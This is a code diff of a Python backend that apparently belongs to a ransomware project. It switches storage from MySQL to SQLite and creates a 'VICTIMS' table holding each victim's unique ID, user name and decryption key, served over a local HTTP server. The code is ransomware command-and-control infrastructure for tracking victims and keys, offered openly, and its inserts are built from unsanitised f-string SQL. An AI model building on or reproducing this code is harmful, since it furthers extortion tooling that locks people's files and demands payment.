@@ -1,52 +1,38 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import mysql.connector
-from mysql.connector import Error
+import sqlite3
 
-connection = None
 
-def create_server_connection(host_name, user_name, user_password):
-    connection = None
-    
-    try:
-        connection = mysql.connector.connect(host = host_name, user = user_name, passwd = user_password)
-        print("Connection Successful")
-    except Error as err:
-        print(f"Error: '{err}'")
-
-    return connection
-
-def createDatabase(connection, query):
+def createTable(connection):
     cursor = connection.cursor()
-    try:
-        cursor.execute(query)
-        print("Database created.")
-    except Error as err:
-        print(f"Error: '{err}'")
+    cursor.execute("""CREATE TABLE IF NOT EXISTS VICTIMS(
+        UniqueId VARCHAR2(50) PRIMARY KEY,
+        UserName VARCHAR2(50) NOT NULL,
+        DecryptionKey INT NOT NULL
+        );
+        """)
+    print("Table created successfully!")
+    connection.commit()
 
-def connectToDatabase(host, username, passwd, db):
-    
-    try:
-        connection = mysql.connector.connect(host = host, user = username, passwd = passwd, database = db)
-        print("Connected to Database {}".format(db))
-    except Error as err:
-        print("Error: '{}'".format(err))
-
-    return connection
 
 def execute(connection, query):
     cursor = connection.cursor()
-    try:
-        cursor.execute(query)
-        connection.commit()
-        print("Query executed.")
-    except Error as err:
-        print(f"Error: '{err}'")
+    cursor.execute(query)
+    connection.commit()
+    print("Query executed.")
 
 def insertValues(id, user, key):
     insertValue = f"""
-    INSERT INTO details VALUES ('{id}', '{user}', {key});
+    INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key});
     """
     return insertValue
+
+def retrieve(connection):
+    cursor = connection.cursor()
+    details = cursor.execute("SELECT * FROM VICTIMS")
+    print(details.fetchall()
+    )
+
 
 class Server(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -73,20 +59,8 @@ if __name__ == "__main__":
     username, passwd = ("YOUR_USERNAME_HERE", "YOUR_PASSWORD_HERE")    # enter the creds
 
 
-    connection = create_server_connection("localhost", username, passwd)    
-    createDatabase(connection, "CREATE DATABASE RansomDetails")    
-    connection = connectToDatabase("localhost", username, passwd, "RansomDetails")    
-
-    createTable = """
-    CREATE TABLE Details(
-        uniqueId VARCHAR(30) PRIMARY KEY,
-        username VARCHAR(30) NOT NULL,
-        decryption_key INT NOT NULL
-    );
-    """
-    execute(connection, createTable)    
-
+    connection = sqlite3.connect("Details.db")    
+    createTable(connection)   
+    # retrieve(connection)
     WebServer = HTTPServer(("localhost", 8000), Server)
     WebServer.serve_forever()
-
-    # trying to push this into github
